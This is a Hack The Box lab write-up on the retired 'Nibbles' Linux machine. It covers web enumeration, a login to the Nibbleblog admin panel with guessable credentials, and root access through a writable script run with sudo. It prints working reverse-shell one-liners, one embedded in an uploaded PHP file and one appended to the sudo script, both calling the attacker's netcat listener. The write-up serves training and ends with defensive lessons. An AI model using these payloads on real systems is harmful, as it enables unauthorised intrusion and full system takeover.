Nibbles

Hack The Box Retired Machine Report

Machine Info

Difficulty: Easy

Operating System: Linux

Status: Retired

Date Completed:06 June 2026

Summary

Nibbles is an easy Linux machine that focuses on web enumeration, credential discovery, authenticated file upload abuse, and basic Linux privilege escalation. The initial foothold was gained by discovering a hidden Nibbleblog directory, logging into the admin panel, and uploading a PHP reverse shell through the image upload functionality. Privilege escalation was achieved by abusing a sudo misconfiguration that allowed the low-privileged user to run a writable script as root without a password.

Recon / Enumeration

nmap -sC -sV -oN nibbles.txt 10.129.11.14

Initial Foothold

After the initial scan, I used searchsploit to check for potential vulnerabilities affecting the identified version of OpenSSH. OpenSSH 7.2p2 has a known username enumeration issue, CVE-2016-6210. However, this was not the main attack path for this machine.

I then moved on to the HTTP service. The website only displayed a simple Hello World message. After inspecting the page source, I found the following HTML comment: 

<!-- /nibbleblog/ directory. Nothing interesting here! -->

This comment hinted at a hidden directory on the web server. I browsed to the /nibbleblog/ directory and then used Gobuster to enumerate additional files and directories. 

gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://nibbles.htb/nibbleblog

The scan revealed several interesting paths:

/README
/admin
/admin.php
/content
/index.php
/languages
/plugins
/themes

I checked the /README file, but it did not contain anything useful. I then explored the /content directory in the browser. Inside this directory, I found three folders: /private, /public, and /tmp.

The /private directory contained two files that stood out: config.xml and users.xml. The users.xml file confirmed that the username admin existed on the Nibbleblog application. The config.xml file contained multiple references to the word nibbles, which looked like a possible password.

I attempted to log into the Nibbleblog admin panel using the username admin and the password nibbles. This was successful and gave me access to the admin dashboard. After exploring the available options, I found the My Image plugin, which allowed image uploads.

Since the application allowed file uploads, I tested whether I could upload a PHP reverse shell. I created a file named image.php with the following payload: 

<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.209 4444 >/tmp/f"); ?>

Before triggering the file, I started a Netcat listener on my attacking machine: 

nc -lvnp 4444

After uploading the PHP file, I used curl to access it from the web server. This executed the payload and returned a reverse shell as the user nibbler. 

curl http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php

Once I had a shell, I upgraded it using Python: 

python3 -c 'import pty;pty.spawn("/bin/bash")'

At this point, I had a stable initial foothold as the user nibbler. I then navigated to the user’s home directory and captured the user flag. 

cat /home/nibbler/user.txt

Privilege Escalation

The next step was to escalate privileges and attempt to gain access to the root flag. I started by checking the user’s home directory and found a file named personal.zip. 

unzip personal.zip

After extracting the archive, I found a script named monitor.sh. This file was interesting because scripts are often useful privilege escalation targets if they can be executed with higher privileges.

I also downloaded and ran linpeas.sh to help identify possible privilege escalation paths. On my attacking machine, I started a Python HTTP server: 

python3 -m http.server 8080

Then, from the target machine, I downloaded the script: 

wget http://10.10.14.209:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

While reviewing the LinPEAS results, I noticed that the user nibbler could run monitor.sh as root without providing a password. This was confirmed with: 

sudo -l

The output showed that monitor.sh could be executed with NOPASSWD. Since I had write access to the script, I modified it to include a reverse shell payload. 

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.209 4445 >/tmp/f' | tee -a monitor.sh

I started another Netcat listener on my attacking machine: 

nc -lvnp 4445

Then I executed the script with sudo: 

sudo ./monitor.sh

This successfully returned a root shell. From there, I was able to capture the root flag. 

cat /root/root.txt

Vulnerabilities / Misconfiguration

The main vulnerability on this machine was weak credential usage for the Nibbleblog admin panel. The application exposed files that helped identify a valid username and hinted at a likely password. Once authenticated, the image upload functionality allowed a PHP reverse shell to be uploaded and executed on the server.

The privilege escalation path was caused by a sudo misconfiguration. The user nibbler was allowed to run the monitor.sh script as root without a password. Since the script was writable by the user, it could be modified to execute commands as root.

Defensive Takeaways

Web applications should avoid exposing sensitive configuration files or user files through the web root. Administrative panels should use strong passwords, account lockout protections, and should not rely on predictable credentials. File upload functionality should validate file types, restrict executable uploads, and store uploaded files in locations where server-side scripts cannot execute.

Sudo permissions should also be reviewed carefully. Users should not be allowed to run writable scripts as root. If a script must be executed with elevated privileges, it should be owned by root, should not be writable by low-privileged users, and should use absolute paths inside the script.

Lessons Learned

This machine reinforced the importance of checking page source code, enumerating hidden web directories, and reviewing exposed application files. It also showed how weak credentials and upload functionality can lead to remote code execution. For privilege escalation, I learned how dangerous writable scripts can be when combined with sudo permissions and NOPASSWD.

I also gained more practice using tools like Gobuster, Curl, Netcat, LinPEAS, and basic Linux enumeration commands to move from initial access to root access.
